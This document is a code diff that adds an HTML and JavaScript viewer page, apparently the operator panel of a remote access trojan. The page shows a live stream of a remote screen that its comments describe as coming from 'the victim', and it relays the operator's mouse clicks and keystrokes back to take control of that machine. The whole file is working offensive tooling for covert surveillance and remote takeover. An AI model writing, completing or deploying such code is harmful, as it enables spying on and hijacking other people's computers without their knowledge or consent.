@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Live Screen View</title>
+    <style>
+        body { 
+            margin: 0; 
+            padding: 0; 
+            background: #0d1117; /* GitHub Dark mode bg */
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif; 
+            overflow: hidden; 
+        }
+        #screen { 
+            max-width: 100%; 
+            max-height: 100vh; 
+            box-shadow: 0 0 20px rgba(0,0,0,0.8);
+        }
+        #status-bar { 
+            position: absolute; 
+            top: 20px; 
+            left: 20px; 
+            background: rgba(22, 27, 34, 0.85); 
+            border: 1px solid #30363d;
+            color: #c9d1d9; 
+            padding: 10px 15px; 
+            border-radius: 6px; 
+            z-index: 1000; 
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+        }
+        .dot { 
+            display: inline-block; 
+            width: 10px; 
+            height: 10px; 
+            background: #ff4444; 
+            border-radius: 50%; 
+            margin-right: 10px; 
+        }
+        .blinking {
+            animation: blink 1s infinite alternate;
+        }
+        @keyframes blink { 
+            from { opacity: 1; box-shadow: 0 0 5px #ff4444; } 
+            to { opacity: 0.3; } 
+        }
+        #token-display {
+            color: #8b949e;
+            font-family: monospace;
+            margin-left: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div id="status-bar">
+        <span class="dot" id="indicator"></span>
+        <span id="status-text">Connecting to session...</span>
+        <span id="token-display"></span>
+    </div>
+
+    <!-- The user's screen stream will appear here -->
+    <img id="screen" src="" alt="">
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
+    <script>
+        // The token parameter is passed from Flask into the Javascript
+        const uniqueClientId = "{{ client_id }}";
+        const socket = io();
+        
+        const screenImg = document.getElementById('screen');
+        const statusText = document.getElementById('status-text');
+        const indicator = document.getElementById('indicator');
+        const tokenDisplay = document.getElementById('token-display');
+        
+        let framesReceived = 0;
+
+        socket.on('connect', () => {
+            statusText.innerText = 'Authenticating Viewer...';
+            indicator.style.background = '#e3b341'; // yellow
+            
+            // Tell the server we want to watch this specific tracking token
+            socket.emit('viewer_connect', { client_id: uniqueClientId });
+        });
+        
+        socket.on('disconnect', () => {
+            statusText.innerText = 'Connection Lost';
+            indicator.style.background = '#ff4444'; // red
+            indicator.classList.remove('blinking');
+        });
+        
+        socket.on('new_frame', (data) => {
+            // First time we get a frame, update UI to show Active Session
+            if (framesReceived === 0) {
+                statusText.innerText = 'Live Feed Active';
+                indicator.style.background = '#2ea043'; // green
+                indicator.classList.add('blinking');
+                // Trim token for display purposes
+                tokenDisplay.innerText = `[ID: ${uniqueClientId.substring(0, 15)}...]`;
+            }
+            
+            framesReceived++;
+            // Update the image src with the base64 JPEG from the victim
+            screenImg.src = 'data:image/jpeg;base64,' + data.frame;
+        });
+
+        // ==========================================
+        // Remote Control Interaction Logic
+        // ==========================================
+        
+        // Helper to calculate relative coordinates
+        function getRelativeCoordinates(e) {
+            const rect = screenImg.getBoundingClientRect();
+            let x = e.clientX - rect.left;
+            let y = e.clientY - rect.top;
+            
+            // Normalize between 0.0 and 1.0
+            return {
+                x_rel: Math.max(0, Math.min(1, x / rect.width)), 
+                y_rel: Math.max(0, Math.min(1, y / rect.height))
+            };
+        }
+
+        // 1. Mouse Click
+        screenImg.addEventListener('mousedown', (e) => {
+            e.preventDefault(); // Stop default browser dragging
+            const coords = getRelativeCoordinates(e);
+            
+            let btn = 'left';
+            if (e.button === 1) btn = 'middle';
+            if (e.button === 2) btn = 'right';
+            
+            socket.emit('input_event', {
+                client_id: uniqueClientId,
+                action: 'mouse_click',
+                button: btn,
+                x_rel: coords.x_rel,
+                y_rel: coords.y_rel
+            });
+        });
+        
+        // Disable right click menu on the video stream
+        screenImg.addEventListener('contextmenu', e => e.preventDefault());
+
+        // 2. Keyboard Input
+        // Must click the window first to focus it before typing
+        window.addEventListener('keydown', (e) => {
+            // Ignore if typing in an input box (if we ever added one)
+            if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') return;
+            
+            e.preventDefault(); // Stop scrolling when pressing space/arrows
+            socket.emit('input_event', {
+                client_id: uniqueClientId,
+                action: 'key_press',
+                key: e.key.toLowerCase()
+            });
+        });
+    </script>
+</body>
+</html>
